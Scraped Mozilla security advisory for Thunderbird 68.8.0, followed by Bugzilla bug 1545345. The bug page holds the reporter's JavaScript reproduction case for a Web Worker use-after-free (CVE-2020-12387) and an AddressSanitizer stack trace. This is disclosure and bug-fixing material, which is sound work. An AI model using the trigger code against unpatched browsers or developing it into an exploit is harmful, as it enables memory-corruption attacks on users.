=== Content from www.mozilla.org_e13827cb_20250119_122050.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-18

## Security Vulnerabilities fixed in Thunderbird 68.8.0

Announced
May 5, 2020
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 68.8

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2020-12397: Sender Email Address Spoofing using encoded Unicode characters](#CVE-2020-12397)

Reporter
Ahmed Elsobky (@0xSobky)
Impact
low
##### Description

By encoding Unicode whitespace characters within the From
email header, an attacker can spoof the sender email address
that Thunderbird displays.

##### References

* [Bug 1617370](https://bugzilla.mozilla.org/show_bug.cgi?id=1617370)

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12395: Memory safety bugs fixed in Thunderbird 68.8.0](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 68.8.0](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_56a175c8_20250119_135941.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1545345)
* [XML](/show_bug.cgi?ctype=xml&id=1545345)

Closed
[Bug 1545345](/show_bug.cgi?id=1545345)
(CVE-2020-12387)

Opened 6 years ago
Closed 5 years ago

# Web Workers - Use After Free with XMLHttpRequest

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Web Workers - Use After Free with XMLHttpRequest

## Categories

### (Core :: DOM: Workers, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Workers#DOM%3A%20Workers)

DOM: Workers
▾

Core :: DOM: Workers
This component covers the [Web Workers](https://developer.mozilla.org/En/DOM/Worker) implementation in Gecko.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Workers&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Workers&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Workers)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

68 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla76

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| a11y-review | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox68 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix) |
| firefox69 | [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) |
| firefox71 | [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix) |
| firefox72 | [+](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=wontfix) |
| firefox74 | [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=wontfix) |
| firefox75 | [+](/buglist.cgi?f1=cf_tracking_firefox75&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix) |
| firefox76 | [+](/buglist.cgi?f1=cf_tracking_firefox76&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr68 | 76+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox68 |  | wontfix |
| firefox69 | + | wontfix |
| firefox70 | + | wontfix |
| firefox71 | + | wontfix |
| firefox72 | + | wontfix |
| firefox73 | + | wontfix |
| firefox74 | + | wontfix |
| firefox75 | + | wontfix |
| firefox76 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: loobenyang, Assigned: asuth)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=40)  [asuth](/user_profile?user_id=151407)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=40)  [loobenyang](/user_profile?user_id=506912)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/056757eff6ed7c8ec26f61e3bf7695fe?d=mm&size=40)  [smaug](/user_profile?user_id=39966)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

20 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1588248](/show_bug.cgi?id=1588248 "RESOLVED FIXED - Assertion failure: !mProxy->mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1545345&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1545345)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

[1649448](/show_bug.cgi?id=1649448 "RESOLVED FIXED - Assertion failure: aGlobal, at /builds/worker/checkouts/gecko/dom/file/Blob.cpp:74")

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[Duplicates:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates)

[1547059](/show_bug.cgi?id=1547059 "RESOLVED DUPLICATE - AddressSanitizer: heap-use-after-free [@ CCGraphBuilder::NoteXPCOMChild] with READ of size 8")

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1557732](/show_bug.cgi?id=1557732 "VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345")

## Details

### (Keywords: csectype-uaf, reporter-external, sec-critical, Whiteboard: [post-critsmash-triage][adv-main76+][adv-ESR68.8+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-12387

[Keywords:](/describekeywords.cgi)

[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[post-critsmash-triage][adv-main76+][adv-ESR68.8+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a10066826_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [asuth](/user_profile?user_id=151407) | [qe-verify](#c53 "5 years ago") | - |
| --- | --- | --- |
| [asuth](/user_profile?user_id=151407) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (5 files)

| [UAF\_NoteXPCOMChild\_Repro.js](/attachment.cgi?id=9059182)  [6 years ago](#c0)  [Looben Yang](/user_profile?user_id=506912)   1.60 KB, text/javascript |  | [Details](/attachment.cgi?id=9059182&action=edit) |
| --- | --- | --- |
| [UAF\_NoteXPCOMChild\_EIP\_41414141.js](/attachment.cgi?id=9059231)  [6 years ago](#c2)  [Looben Yang](/user_profile?user_id=506912)   2.19 KB, text/javascript |  | [Details](/attachment.cgi?id=9059231&action=edit) |
| [Bug 1545345 - Improve worker shutdown. r=baku,smaug](/attachment.cgi?id=9130470)  [5 years ago](#c44)  [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)   47 bytes, text/x-phabricator-request | dveditz : [sec-approval+](#a29524244_1689 "5 years ago") | [Details](/attachment.cgi?id=9130470&action=edit) | [Review](/attachment.cgi?id=9130470) |
| [Bug 1545345 - Improve worker shutdown on ESR68. r=baku,smaug](/attachment.cgi?id=9141601)  [5 years ago](#c54)  [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-esr68+](#c57 "5 years ago") | [Details](/attachment.cgi?id=9141601&action=edit) | [Review](/attachment.cgi?id=9141601) |
| [advisory.txt](/attachment.cgi?id=9144306)  [5 years ago](#c59)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   202 bytes, text/plain |  | [Details](/attachment.cgi?id=9144306&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1545345#c0)• 6 years ago |
|  | |

Attached file
[UAF\_NoteXPCOMChild\_Repro.js](attachment.cgi?id=9059182)
— [Details](attachment.cgi?id=9059182&action=edit)

Reproduction test case (full server code in attached file UAF\_NoteXPCOMChild\_Repro.js):

```
Main Page code:
    <script type="text/javascript">
    var worker = new Worker("worker0.js");
    var bc0 = new BroadcastChannel("test_channel");
    setInterval(function(){ bc0.postMessage("AAAA");}, 10);
    setTimeout(function(){location.reload();},800);
    </script>

Worker code:
    var bc0 = new BroadcastChannel("test_channel");
    bc0.onmessage = function(e) {
    xmlReq0.send();
    xmlReq0.abort();
    }
    var fileReader1 =  new FileReader();
    fileReader1.onloadend = function(e) {
    xmlReq0.open("get", "nofile.js", false);
    }
    var xmlReq0 = new XMLHttpRequest();
    close();
    fileReader1.readAsArrayBuffer(new Blob(["AAAA"], {type : "text/html"}));
    fileReader1.abort();

```

Steps to reproduce:

1. Run server side script UAF\_NoteXPCOMChild\_Repro.js with Node.js (node UAF\_NoteXPCOMChild\_Repro.js).

2. Enter <http://localhost:12345> in Firefox asan build.

3. ASAN reports a Use After Free with XMLHttpRequest:

```
    =================================================================
    ==7061==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000d0540 at pc 0x7faee9713b6f bp 0x7faed52472b0 sp 0x7faed52472a8
    READ of size 8 at 0x6120000d0540 thread T22 (DOM Worker)

```

Firefox version: 68.0a1 (2019-04-17) (64-bit)

OS: Ubuntu 16.04 LTS 64bit

Stack trace:

```
=================================================================
==7061==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000d0540 at pc 0x7faee9713b6f bp 0x7faed52472b0 sp 0x7faed52472a8
READ of size 8 at 0x6120000d0540 thread T22 (DOM Worker)
    #0 0x7faee9713b6e in ~nsCOMPtr_base /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:331:7
    #1 0x7faee9713b6e in mozilla::WidgetEvent::~WidgetEvent() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/BasicEvents.h:500
    #2 0x7faef0173e9d in mozilla::WidgetEvent::~WidgetEvent() /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/BasicEvents.h:500:26
    #3 0x7faeee23825b in mozilla::dom::Event::~Event() /builds/worker/workspace/build/src/dom/events/Event.cpp:113:5
    #4 0x7faeee1c9a3d in mozilla::dom::Event::~Event() /builds/worker/workspace/build/src/dom/events/Event.cpp:109:17
    #5 0x7faee7bf5ba6 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7
    #6 0x7faee7bf488e in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3
    #7 0x7faee7bfe048 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3
    #8 0x7faee7bfd630 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9
    #9 0x7faee7c0119c in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21
    #10 0x7faef5088dc7 in callGCCallback /builds/worker/workspace/build/src/js/src/gc/GC.cpp:1840:3
    #11 0x7faef5088dc7 in js::gc::GCRuntime::maybeCallGCCallback(JSGCStatus) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7375
    #12 0x7faef5089eff in ~AutoCallGCCallbacks /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7354:32
    #13 0x7faef5089eff in js::gc::GCRuntime::gcCycle(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7464
    #14 0x7faef508d423 in js::gc::GCRuntime::collect(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7622:9
    #15 0x7faef502347d in js::gc::GCRuntime::gc(JSGCInvocationKind, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7710:3
    #16 0x7faeef978f39 in mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run() /builds/worker/workspace/build/src/dom/workers/RuntimeService.cpp:2325:5
    #17 0x7faee7db73a1 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14
    #18 0x7faee7dbd4b8 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10
    #19 0x7faee8e01e40 in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:333:5
    #20 0x7faee8d2e5b2 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10
    #21 0x7faee8d2e5b2 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308
    #22 0x7faee8d2e5b2 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290
    #23 0x7faee7db12fa in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:454:11
    #24 0x7faf0884e05d in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5
    #25 0x7faf084946b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)
    #26 0x7faf0751d41c in clone /build/glibc-Cl5G7W/glibc-2.23/misc/../sysdeps/unix/sysv/linux/x86_64/clone.S:109

0x6120000d0540 is located 0 bytes inside of 272-byte region [0x6120000d0540,0x6120000d0650)
freed by thread T22 (DOM Worker) here:
    #0 0x55c5c6461182 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3
    #1 0x7faee7bf5ba6 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7
    #2 0x7faee7bf488e in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3
    #3 0x7faee7bfe048 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3
    #4 0x7faee7bfd630 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9
    #5 0x7faee7c0119c in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21
    #6 0x7faef5088dc7 in callGCCallback /builds/worker/workspace/build/src/js/src/gc/GC.cpp:1840:3
    #7 0x7faef5088dc7 in js::gc::GCRuntime::maybeCallGCCallback(JSGCStatus) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7375
    #8 0x7faef5089eff in ~AutoCallGCCallbacks /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7354:32
    #9 0x7faef5089eff in js::gc::GCRuntime::gcCycle(bool, js::SliceBudget, JS::GCReason) /builds/worker/workspace/build/src/js/src/gc/GC.cpp:7464
